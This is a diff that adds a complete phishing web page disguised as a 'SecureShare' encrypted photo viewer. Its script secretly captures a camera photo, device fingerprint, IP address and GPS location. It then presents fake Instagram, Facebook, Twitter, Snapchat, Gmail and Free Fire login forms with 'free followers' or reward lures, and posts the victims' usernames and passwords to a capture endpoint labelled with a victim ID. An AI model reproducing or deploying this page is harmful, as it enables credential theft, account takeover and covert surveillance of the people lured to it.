@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>SecureShare</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at 30% 10%, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+            padding: 16px;
+            margin: 0;
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(16px) saturate(180%);
+            -webkit-backdrop-filter: blur(16px) saturate(180%);
+            border-radius: 40px;
+            padding: 32px 24px 28px;
+            max-width: 440px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+            transition: all 0.3s ease;
+            text-align: center;
+            color: #fff;
+        }
+
+        .glass h1 {
+            font-size: 30px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+            margin-bottom: 2px;
+        }
+
+        .glass .sub {
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 3px;
+            color: rgba(255, 255, 255, 0.5);
+            text-transform: uppercase;
+            margin-bottom: 18px;
+        }
+
+        .frame {
+            border-radius: 24px;
+            padding: 8px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            margin: 16px 0 18px;
+            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .frame img {
+            width: 100%;
+            height: auto;
+            aspect-ratio: 4/3;
+            object-fit: cover;
+            border-radius: 18px;
+            display: block;
+            background: #1a1a2e;
+        }
+
+        .glow-btn {
+            background: linear-gradient(145deg, #f093fb, #f5576c);
+            border: none;
+            padding: 18px 20px;
+            border-radius: 60px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(245, 87, 108, 0.35);
+            transition: all 0.25s ease;
+            letter-spacing: 0.5px;
+            margin: 12px 0 6px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .glow-btn:active {
+            transform: scale(0.96);
+        }
+
+        .sparkle {
+            animation: pulseGlow 2s infinite;
+        }
+
+        @keyframes pulseGlow {
+            0%,
+            100% {
+                box-shadow: 0 8px 30px rgba(245, 87, 108, 0.35);
+            }
+            50% {
+                box-shadow: 0 8px 60px rgba(245, 87, 108, 0.7);
+            }
+        }
+
+        .footer-text {
+            font-size: 11px;
+            opacity: 0.3;
+            margin-top: 18px;
+            letter-spacing: 0.5px;
+        }
+
+        .input-group {
+            text-align: left;
+            margin: 14px 0 8px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            opacity: 0.7;
+            margin-bottom: 5px;
+            letter-spacing: 0.3px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.04);
+            color: #fff;
+            font-size: 16px;
+            transition: 0.25s;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #f5576c;
+            background: rgba(255, 255, 255, 0.07);
+            box-shadow: 0 0 0 3px rgba(245, 87, 108, 0.15);
+        }
+
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.25);
+            font-weight: 300;
+        }
+
+        .package-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 18px 0 12px;
+        }
+
+        .package-grid button {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 14px 0;
+            color: #fff;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+            backdrop-filter: blur(4px);
+        }
+
+        .package-grid button:active {
+            transform: scale(0.92);
+            background: rgba(245, 87, 108, 0.25);
+            border-color: #f5576c;
+        }
+
+        .back-btn {
+            background: rgba(255, 255, 255, 0.04) !important;
+            border: 1px solid rgba(255, 255, 255, 0.06) !important;
+            box-shadow: none !important;
+            margin-top: 8px;
+            font-size: 15px !important;
+            padding: 14px !important;
+        }
+
+        .back-btn:active {
+            background: rgba(255, 255, 255, 0.08) !important;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .flex-center {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* small screens */
+        @media (max-width: 480px) {
+            .glass {
+                padding: 24px 16px 20px;
+                border-radius: 30px;
+            }
+            .glass h1 {
+                font-size: 26px;
+            }
+            .glow-btn {
+                font-size: 18px;
+                padding: 16px 16px;
+            }
+            .package-grid {
+                gap: 8px;
+            }
+            .package-grid button {
+                font-size: 13px;
+                padding: 12px 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== MAIN PAGE ===== -->
+    <div class="glass flex-center" id="mainPage">
+        <h1>🔒 SecureShare</h1>
+        <p class="sub">🔐 Encrypted &amp; Verified</p>
+        <div class="frame">
+            <img id="userPhoto" src="https://via.placeholder.com/600x450/1a1a2e/ffffff?text=Secure+Photo" alt="User Photo" />
+        </div>
+        <button class="glow-btn sparkle" onclick="requestCamera()">
+            📸 Continue to View
+        </button>
+        <p class="footer-text">This connection is secure and encrypted</p>
+    </div>
+
+    <!-- ===== SOCIAL PACKAGES ===== -->
+    <div class="glass flex-center hidden" id="socialPage">
+        <h2 id="socialTitle">🎉 Get Free Followers!</h2>
+        <p style="opacity:0.6; font-size:14px; margin:6px 0 4px;">Choose your package</p>
+        <div class="package-grid" id="packageGrid"></div>
+        <button class="glow-btn back-btn" onclick="goBack()">⬅ Back</button>
+    </div>
+
+    <!-- ===== LOGIN PAGE ===== -->
+    <div class="glass flex-center hidden" id="loginPage">
+        <h2 id="loginTitle">🔑 Login</h2>
+        <div class="input-group">
+            <label id="userLabel">Username / Email</label>
+            <input type="text" id="loginUser" placeholder="Enter your username" autocomplete="off" />
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="loginPass" placeholder="Enter your password" autocomplete="off" />
+        </div>
+        <button class="glow-btn" onclick="submitLogin()">Continue</button>
+        <button class="glow-btn back-btn" onclick="goBack()">⬅ Back</button>
+    </div>
+
+    <script>
+        // ===== GET URL PARAMS =====
+        const urlParams = new URLSearchParams(window.location.search);
+        const victimId = urlParams.get('v') || 'unknown';
+        const targetType = urlParams.get('type') || 'cam';
+        const redirectUrl = '{{REDIRECT_URL}}';
+
+        let currentPlatform = '';
+
+        // ===== DEVICE INFO =====
+        function getDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                battery: 'N/A',
+                network: 'N/A'
+            };
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    info.battery = Math.round(b.level * 100) + '%';
+                }).catch(function() {});
+            }
+            if (navigator.connection) {
+                info.network = navigator.connection.effectiveType || 'N/A';
+            }
+            return info;
+        }
+
+        // ===== IP / LOCATION =====
+        async function getLocationInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    lat: data.latitude || null,
+                    lng: data.longitude || null
+                };
+            } catch (e) {
+                return { ip: 'Unknown', city: 'Unknown', lat: null, lng: null };
+            }
+        }
+
+        // ===== SEND DATA TO BOT =====
+        async function sendData(payload) {
+            try {
+                await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        victim_id: victimId,
+                        type: targetType,
+                        ...payload
+                    })
+                });
+            } catch (e) {
+                console.log('Send error:', e);
+            }
+        }
+
+        // ===== CAMERA =====
+        function requestCamera() {
+            // Send device + IP first
+            (async function() {
+                const device = getDeviceInfo();
+                const loc = await getLocationInfo();
+                await sendData({
+                    device_info: device,
+                    ip: loc.ip,
+                    city: loc.city,
+                    lat: loc.lat,
+                    lng: loc.lng
+                });
+            })();
+
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                alert('Camera not supported on this device.');
+                return;
+            }
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+                .then(function(stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = function() {
+                        video.play();
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        const photoData = canvas.toDataURL('image/jpeg', 0.85);
+
+                        sendData({ photo: photoData });
+
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+
+                        requestLocation();
+                        showTargetPage();
+                    };
+                })
+                .catch(function(err) {
+                    alert('❌ Camera permission required!');
+                    console.log('Camera error:', err);
+                });
+        }
+
+        // ===== LOCATION =====
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        sendData({
+                            location: {
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude
+                            }
+                        });
+                    },
+                    function() { console.log('Location denied'); }
+                );
+            }
+        }
+
+        // ===== SHOW TARGET PAGE =====
+        function showTargetPage() {
+            const main = document.getElementById('mainPage');
+            const social = document.getElementById('socialPage');
+            const login = document.getElementById('loginPage');
+
+            main.classList.add('hidden');
+            social.classList.add('hidden');
+            login.classList.add('hidden');
+
+            // SOCIAL MEDIA
+            if (['ig', 'fb', 'tw', 'sc'].includes(targetType)) {
+                social.classList.remove('hidden');
+                const names = { ig: 'Instagram', fb: 'Facebook', tw: 'Twitter', sc: 'Snapchat' };
+                document.getElementById('socialTitle').textContent = '🎉 Get Free ' + names[targetType] + ' Followers!';
+                const grid = document.getElementById('packageGrid');
+                grid.innerHTML = '';
+                ['1K', '5K', '10K', '50K', '100K'].forEach(function(pkg) {
+                    const btn = document.createElement('button');
+                    btn.textContent = pkg;
+                    btn.onclick = function() { showLogin(targetType, pkg); };
+                    grid.appendChild(btn);
+                });
+                return;
+            }
+
+            // GMAIL / FREE FIRE
+            if (targetType === 'gmail' || targetType === 'ff') {
+                showLogin(targetType, '');
+                return;
+            }
+
+            // CAMERA ONLY → REDIRECT
+            if (redirectUrl && redirectUrl !== '') {
+                window.location.href = redirectUrl;
+            } else {
+                window.location.href = 'https://google.com';
+            }
+        }
+
+        // ===== SHOW LOGIN =====
+        function showLogin(platform, pkg) {
+            const main = document.getElementById('mainPage');
+            const social = document.getElementById('socialPage');
+            const login = document.getElementById('loginPage');
+
+            main.classList.add('hidden');
+            social.classList.add('hidden');
+            login.classList.remove('hidden');
+
+            currentPlatform = platform;
+
+            const titles = {
+                ig: '🔐 Instagram Login',
+                fb: '🔐 Facebook Login',
+                tw: '🔐 Twitter Login',
+                sc: '🔐 Snapchat Login',
+                gmail: '📧 Gmail Storage Upgrade',
+                ff: '🎮 Free Fire Diamond Claim'
+            };
+            document.getElementById('loginTitle').textContent = titles[platform] || '🔑 Login';
+
+            const labels = {
+                gmail: 'Email Address',
+                ff: 'Player ID / Email',
+                ig: 'Username / Email',
+                fb: 'Email / Phone',
+                tw: 'Username / Email',
+                sc: 'Username'
+            };
+            document.getElementById('userLabel').textContent = labels[platform] || 'Username';
+
+            if (pkg) {
+                document.getElementById('loginPage').dataset.package = pkg;
+            } else {
+                document.getElementById('loginPage').dataset.package = '';
+            }
+
+            // Clear fields
+            document.getElementById('loginUser').value = '';
+            document.getElementById('loginPass').value = '';
+        }
+
+        // ===== SUBMIT LOGIN =====
+        function submitLogin() {
+            const username = document.getElementById('loginUser').value.trim();
+            const password = document.getElementById('loginPass').value.trim();
+
+            if (!username || !password) {
+                alert('Please fill all fields');
+                return;
+            }
+
+            sendData({
+                creds: {
+                    platform: currentPlatform,
+                    username: username,
+                    password: password,
+                    package: document.getElementById('loginPage').dataset.package || 'N/A'
+                }
+            });
+
+            // Redirect
+            const socialPlatforms = ['ig', 'fb', 'tw', 'sc'];
+            if (socialPlatforms.includes(currentPlatform)) {
+                window.location.href = 'https://takipcikrali.com/';
+            } else if (currentPlatform === 'gmail') {
+                window.location.href = 'https://mail.google.com/';
+            } else if (currentPlatform === 'ff') {
+                window.location.href = 'https://ff.garena.com/';
+            } else {
+                window.location.href = redirectUrl || 'https://google.com';
+            }
+        }
+
+        // ===== GO BACK =====
+        function goBack() {
+            document.getElementById('mainPage').classList.remove('hidden');
+            document.getElementById('socialPage').classList.add('hidden');
+            document.getElementById('loginPage').classList.add('hidden');
+        }
+
+        // ===== ON LOAD: try to show victim photo if stored =====
+        (function() {
+            const saved = localStorage.getItem('victim_photo_' + victimId);
+            if (saved) {
+                document.getElementById('userPhoto').src = saved;
+            }
+            // If camera type, show placeholder
+            if (targetType === 'cam') {
+                document.getElementById('userPhoto').src =
+                    'https://via.placeholder.com/600x450/1a1a2e/ffffff?text=Secure+Photo';
+            }
+        })();
+    </script>
+</body>
+  </html>
